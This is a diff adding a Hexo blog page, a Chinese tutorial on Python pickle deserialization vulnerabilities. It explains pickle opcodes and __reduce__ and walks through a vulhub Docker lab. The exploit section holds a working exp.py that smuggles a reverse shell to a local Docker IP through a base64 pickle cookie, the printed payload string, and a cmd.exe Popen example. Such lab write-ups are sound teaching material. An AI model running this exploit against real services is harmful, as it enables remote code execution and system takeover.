@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>python反序列化漏洞浅析 ~ Hexo</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
+
+<link rel="stylesheet" href="/css/main.css"  >
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
+
+
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/动漫4.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Thursday, April 9th 2020, 1:51 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.5k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      6 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。</p>
+<p>主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。</p>
+<p>引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞</p>
+<p>此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数<strong>wakeup</strong></p>
+<h3 id="0x02-Pickle模块"><a href="#0x02-Pickle模块" class="headerlink" title="0x02 Pickle模块"></a>0x02 Pickle模块</h3><ol>
+<li><p>pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流，这个字符流包含反序列化（从字符流构建对象）所需的所有数据。</p>
+</li>
+<li><p>pickle有两个主要方法。第一个是dump-把对象导入到文件；第二个是load-从文件中加载对象。</p>
+<p>实例</p>
+<pre><code>import pickle
+
+l1 = [&#39;data1&#39;,&#39;data2&#39;,&#39;data3&#39;, &#39;data4&#39;]
+file = open(&quot;testfile&quot;,&#39;wb&#39;) 
+
+# 把l1保存到文件
+pickle.dump(l1, file)   
+file.close() 
+
+##############################################
+
+file = open(&quot;testfile&quot;,&#39;r&#39;)
+
+# 从文件中加载保存的对象
+l2 = pickle.load(file)  
+print(l2)
+# 输出: [&#39;data1&#39;, &#39;data2&#39;, &#39;data3&#39;]</code></pre></li>
+<li><p>pickle instructions</p>
+<pre><code>cos
+system
+(S&#39;/bin/sh&#39;
+tR.</code></pre><blockquote>
+<p>Pickle is a stack language which means that the pickle instructions push data onto the stack or pop data off of the stack and operate on it in some fashion. To understand how the canonical pickle works, we need only understand six pickle instructions:</p>
+<ul>
+<li><code>c</code>: Read to the newline as the module name, <code>module</code>. Read the next line as the object name, <code>object</code>. Push <code>module.object</code> onto the stack.</li>
+<li><code>(</code>: Insert a marker object onto the stack. For our purpose, this is paired with <code>t</code> to produce a tuple.</li>
+<li><code>t</code>: Pop objects off the stack until a <code>(</code> is popped and create a tuple object containing the objects popped (except for the <code>(</code>) in the order they were /pushed/ onto the stack. The tuple is pushed onto the stack</li>
+<li><code>S</code>: Read the string in quotes up to the newline and push it onto the stack.</li>
+<li><code>R</code>: Pop a tuple and a <a href="http://stackoverflow.com/questions/111234/what-is-a-callable-in-python" target="_blank" rel="noopener">callable</a> off the stack and call the callable with the tuple as arguments. Push the result onto the stack.</li>
+<li><code>.</code>: End of the pickle.</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+<ul>
+<li><p>c：读取新的一行作为模块名module，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</p>
+</li>
+<li><p>(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p>
+</li>
+<li><p>t：从堆栈中弹出对象，直到一个“<code>(</code>”被弹出，并创建一个包含弹出对象（除了“<code>(</code>”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p>
+</li>
+<li><p>S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</p>
+</li>
+<li><p>R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</p>
+</li>
+<li><p>.：结束pickle。</p>
+<p>说人话：</p>
+</li>
+<li><p>c：接下来的2行内容类似于，<code>os.system</code>、<code>urllib.unquote</code>是<code>module.object</code>的形式。</p>
+</li>
+<li><p>(：就是左括号</p>
+</li>
+<li><p>t：相当于右扩号</p>
+</li>
+<li><p>S：代表本行后面的内容是<code>String</code>，即字符串。</p>
+</li>
+<li><p>R：执行紧靠自己左边的一个括号对中的内容，即<code>(</code> 和他t直接的内容。</p>
+</li>
+<li><p>.：点号结束pickle。</p>
+</li>
+</ul>
+<h3 id="0x03漏洞分析"><a href="#0x03漏洞分析" class="headerlink" title="0x03漏洞分析"></a>0x03漏洞分析</h3><p>类似于php的wakeup魔术方法，python中的<strong>reduce</strong>，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。</p>
+<p>如果序列化的内容可控，只需要将相应代码写入<strong>reduce</strong>函数中，接收端在反序列化的时候就会自动执行。</p>
+<p>下面是一个简单的示例：</p>
+<p>exp:</p>
+<pre><code>import pickle
+import subprocess
+
+class m3lon(object):
+  def __reduce__(self):
+    return (subprocess.Popen,((&#39;cmd.exe&#39;,),))
+
+pickle.dumps(m3lon())
+# 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p>
+<p>下面模拟接收端</p>
+<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt="img"></a></p>
+<p>弹出shell！</p>
+<h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p>
+<p>app.py</p>
+<pre><code>import pickle
+import base64
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    try:
+        user = base64.b64decode(request.cookies.get(&#39;user&#39;))
+        user = pickle.loads(user)
+        username = user[&quot;username&quot;]
+    except:
+        username = &quot;Guest&quot;
+
+    return &quot;Hello %s&quot; % username
+
+if __name__ == &quot;__main__&quot;:
+    app.run()</code></pre><p>exp.py</p>
+<pre><code>#!/usr/bin/env python3
+import requests
+import pickle
+import os
+import base64
+
+
+class exp(object):
+    def __reduce__(self):
+        s = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+
+
+e = exp()
+s = pickle.dumps(e)
+
+response = requests.get(&quot;http://172.19.0.2:8000/&quot;, cookies=dict(
+    user=base64.b64encode(s).decode()
+))
+
+print(response.content)</code></pre><p><strong>分析</strong></p>
+<p>反序列化的内容为user，通过cookie传输(用户可控)，于是pickle的反序列化漏洞便产生了，通过上面的exp可以查看我们生成的payload</p>
+<pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p>
+<p><strong>流程</strong></p>
+<p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p>
+<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" alt="img"></a></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "python反序列化漏洞浅析&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+</body>
+</html>
